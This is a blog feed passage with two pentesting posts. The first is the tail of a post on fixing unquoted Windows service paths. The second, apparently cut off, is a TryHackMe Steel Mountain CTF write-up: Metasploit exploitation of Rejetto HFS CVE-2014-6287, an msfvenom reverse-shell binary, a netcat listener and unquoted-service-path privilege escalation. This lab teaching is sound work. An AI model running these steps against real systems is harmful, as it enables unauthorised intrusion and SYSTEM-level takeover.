&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;wmic&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pathname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;displayname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;startmode&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;findstr&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/i&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;auto&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;findstr&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/i&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/v&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Windows\&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;findstr&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/i&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/v&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/29.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;If there is, then press &lt;strong&gt;Win+R&lt;/strong&gt; and type &lt;strong&gt;regedit.exe&lt;/strong&gt;, press enter.
&lt;br /&gt;In the directory tree, search for the vulnerable service name under:&lt;br /&gt; &lt;strong&gt;Computer\HKEY_LOCAL_MACHINE\SYSTEM
\ControlSet\Services\{SERVICE NAME}&lt;/strong&gt;.
&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/31.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Find the &lt;strong&gt;ImagePath&lt;/strong&gt; entry, double click it.
&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/32.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Change its value by surrounding the string with quotes.
&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/33.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Run again, this time you should not see any results, you have fixed it:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;wmic&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pathname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;displayname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;startmode&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;findstr&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/i&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;auto&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;findstr&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/i&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/v&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Windows\&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;findstr&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/i&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/v&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h1 id=&quot;how-to-prevent-it-&quot;&gt;How to prevent it ?&lt;/h1&gt;

&lt;p&gt;How on the world I can create a safe service ?
&lt;br /&gt; Simple, when creating a service with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sc.exe&lt;/code&gt;, do not pass the parameter for &lt;strong&gt;binpath&lt;/strong&gt; like this:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;binpath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Program Files\a folder\b folder\c folder&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Instead, do it like this:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;binpath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;\&quot;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C:\Program&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Files\a&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;folder\b&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;folder\c&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;folder&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;\&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Enjoy your safely created service.
&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/35.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
</description>
        <pubDate>Thu, 23 Dec 2021 00:59:00 +0000</pubDate>
        <link>http://localhost:4000/2021/12/23/unquoted-service-path-vulnerability/</link>
        <guid isPermaLink="true">http://localhost:4000/2021/12/23/unquoted-service-path-vulnerability/</guid>
        
        <category>windows-privesc</category>
        
        <category>unqoted-service-path</category>
        
        <category>windows</category>
        
        <category>pentesting</category>
        
        
      </item>
    
      <item>
        <title>THM Steel Mountain CTF Writeup</title>
        <description>&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/steelmountain&quot;&gt;&lt;strong&gt;Solve Yourself »&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The steel mountain is a windows machine. In order to hack into the machine, we are going to exploit  two different 
vulnerabilities that occur on the system.&lt;/p&gt;

&lt;h1 id=&quot;first-method&quot;&gt;FIRST METHOD&lt;/h1&gt;
&lt;h2 id=&quot;1-preperation&quot;&gt;1-Preperation&lt;/h2&gt;
&lt;p&gt;Export the ip address of the machine as a variable for shorthand usage.
&lt;br /&gt;-&amp;gt; export ip={MACHINE IP}
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/2.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;2-enumeration&quot;&gt;2-Enumeration&lt;/h2&gt;
&lt;p&gt;Let us run Network Mapper (&lt;strong&gt;nmap&lt;/strong&gt;) to discover opened ports and services.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Parameter&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Functionality&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-sV&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Probe open ports to determine service/version info&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-sS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;SYN, half TCP scan&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-O&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Enable OS detection&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-T4&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;T{0-5} Set scan speed, higher is faster&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-p-&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Scan all 65536 ports&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-Pn&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Skip host discovery&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-oN&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Write output to a file&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Full command:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;machine IP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;outputfile&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/3.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
There is a web server running on port &lt;strong&gt;80&lt;/strong&gt;, let us visit.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/4.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
There is also one more web server is running at port &lt;strong&gt;8080&lt;/strong&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/5.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
If you click on the &lt;strong&gt;HttpFileServer2.3&lt;/strong&gt; link under the &lt;strong&gt;Server Information&lt;/strong&gt; heading, it will redirect you to the following page.
It seems the HTTP server is being run by &lt;strong&gt;rejetto&lt;/strong&gt;.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/6.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
There is a vulnerablity on the &lt;strong&gt;Rejetto HFS versions 2.3, 2.3a, and 2.3b&lt;/strong&gt;, let’s check.&lt;br /&gt;
&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6287&quot;&gt;&lt;strong&gt;CVE-Database -&amp;gt; Rejetto HFS 2.3&lt;/strong&gt;&lt;/a&gt;
&lt;br /&gt;&lt;a href=&quot;https://www.kb.cert.org/vuls/id/251276&quot;&gt;&lt;strong&gt;More detailed explaination&lt;/strong&gt;&lt;/a&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/7.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;3-exploitation&quot;&gt;3-Exploitation&lt;/h2&gt;

&lt;h3 id=&quot;gaining-access-to-the-system---getting-user-flag&quot;&gt;Gaining Access to the System - Getting User Flag&lt;/h3&gt;
&lt;p&gt;Launch up your &lt;strong&gt;msfconsole&lt;/strong&gt; and do a search for &lt;strong&gt;CVE-2014-6287&lt;/strong&gt; to see if there is any exploit that we can use.
There is one with an excellent rank, awesome! Let us use it.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/8.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
Copy the THM IP with that command:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ifconfig | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; 1 tun0 | &lt;span class=&quot;nb&quot;&gt;tail&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 1 | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;{print $2}&apos;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/9.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
-&amp;gt; set RPORT &lt;strong&gt;8080&lt;/strong&gt;&lt;br /&gt;-&amp;gt; set RHOST &lt;strong&gt;machine IP&lt;/strong&gt;&lt;br /&gt;-&amp;gt; set LHOST &lt;strong&gt;your THM IP&lt;/strong&gt;&lt;br /&gt;-&amp;gt; exploit&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Parameter&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Functionality&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;RPORT&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;The target port (TCP)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;RHOST&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Address of the target&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;LPORT&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;The listen port&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/10.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
After receiving meterpreter session, run &lt;strong&gt;shell&lt;/strong&gt; to get an interactive shell.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/11.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
Find the flag under &lt;strong&gt;C:\users\bill\Desktop&lt;/strong&gt; directory.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/12.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;escalate-the-privileges---getting-the-root-flag&quot;&gt;Escalate the privileges - Getting the Root flag&lt;/h3&gt;

&lt;p&gt;After gaining access to the system as a low-level user, it is time to get administrator privileges to have much more 
permissions against the system. &lt;strong&gt;PowerUp.ps1&lt;/strong&gt; is a program that facilitates fast checks in a windows machine to identify 
any misconfigurations and privilege escalation possibilities.
&lt;br /&gt;-&amp;gt; &lt;a href=&quot;https://github.com/krygeNNN/krygeNNN.github.io/blob/main/assets/documents/tryhackme-steel-mountain-writeup/PowerUp.ps1&quot;&gt;&lt;strong&gt;Download PowerUp.ps1&lt;/strong&gt;&lt;/a&gt;
&lt;br /&gt;-&amp;gt; &lt;a href=&quot;https://github.com/PowerShellMafia/PowerSploit&quot;&gt;&lt;strong&gt;PowerSploit GitHub Repo&lt;/strong&gt;&lt;/a&gt;
&lt;br /&gt;-&amp;gt; Run &lt;strong&gt;exit&lt;/strong&gt; and get back to the &lt;strong&gt;meterpreter&lt;/strong&gt; session.
&lt;br /&gt;-&amp;gt; Upload the script just as we did before to the machine.
&lt;br /&gt;-&amp;gt; Run &lt;strong&gt;load powershell&lt;/strong&gt;
&lt;br /&gt;-&amp;gt; Run &lt;strong&gt;powershell_shell&lt;/strong&gt;
&lt;br /&gt;You will get &lt;strong&gt;PowerShell&lt;/strong&gt; this time instead of a regular &lt;strong&gt;cmd prompt&lt;/strong&gt;.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/13.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
&lt;br /&gt;-&amp;gt; Run &lt;strong&gt;. .\PowerUp.ps1&lt;/strong&gt;
&lt;br /&gt;-&amp;gt; Run &lt;strong&gt;Invoke-AllChecks&lt;/strong&gt;
&lt;br /&gt;&lt;strong&gt;InvokeAllChecks&lt;/strong&gt; will diagnose any detectable vulnerabilities along with their descriptions.
&lt;br /&gt;&lt;br /&gt;The first result we got is a service called &lt;strong&gt;AdvancedSystemCare9&lt;/strong&gt;, and it has a vulnerability called 
&lt;strong&gt;Unquoted Service Path&lt;/strong&gt; &lt;a href=&quot;https://www.bbsec.net/2021/12/23/unquoted-service-path-vulnerability/&quot;&gt;&lt;strong&gt;-&amp;gt; Read more about it&lt;/strong&gt;&lt;/a&gt;. We will abuse this vulnerability. 
&lt;br /&gt;&lt;strong&gt;CanRestart&lt;/strong&gt; field means that the current user, in this case, &lt;strong&gt;bill&lt;/strong&gt;, can manually restart the service even though
the service itself is being run with &lt;strong&gt;LocalSystem&lt;/strong&gt; service account permissions, which has the top-level privileges.
&lt;br /&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account?redirectedfrom=MSDN&quot;&gt;&lt;strong&gt;LocalSystem Service Account&lt;/strong&gt;&lt;/a&gt;
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/14.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Launch up &lt;strong&gt;msfvenom&lt;/strong&gt; to deploy a reverse shell binary.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Parameter&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Functionality&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;LHOST&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;The IP address that the reverse shell will connect&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;LPORT&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;The port that the reverse shell will connect&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-p&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Payload to use&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-o&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Name of the file&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-f&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;File type of the output binary&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Full command:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;={&lt;/span&gt;THM IP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;={&lt;/span&gt;RANDOM FREE PORT&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; exe &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;somename&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;.exe&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/15.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;-&amp;gt; Upload the binary to the target machine.
&lt;br /&gt;-&amp;gt; Get the &lt;strong&gt;shell&lt;/strong&gt; again.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/16.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;-&amp;gt; Relocate the binary into &lt;strong&gt;C:\Program Files (x86)\IObit&lt;/strong&gt; directory.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/17.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;-&amp;gt; Rename the binary to &lt;strong&gt;Advanced.exe&lt;/strong&gt;.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/18.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Start a &lt;strong&gt;netcat&lt;/strong&gt; listener on your machine with the port that is defined when creating
the backdoor.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;nc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-nvlp&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SPECIFIED&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/nc.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;After starting a netcat session, restart the service&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;sc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stop&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AdvancedSystemCareService9&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;sc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AdvancedSystemCareService9&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;When the service boots, &lt;strong&gt;Advanced.exe&lt;/strong&gt; backdoor binary will be executed instead of the &lt;strong&gt;ASCService.exe&lt;/strong&gt;. 
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/19.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
You can find the root flag &lt;strong&gt;root.txt&lt;/strong&gt; under &lt;strong&gt;C:\Users\Administrator\Desktop&lt;/strong&gt; directory.&lt;/p&gt;

&lt;h1 id=&quot;second-method&quot;&gt;SECOND METHOD&lt;/h1&gt;

&lt;p&gt;In this section, instead of using Metasploit and automatizing the process, we will be doing all those steps manually.&lt;/p&gt;

&lt;h2 id=&quot;1-preperation-1&quot;&gt;1-Preperation&lt;/h2&gt;
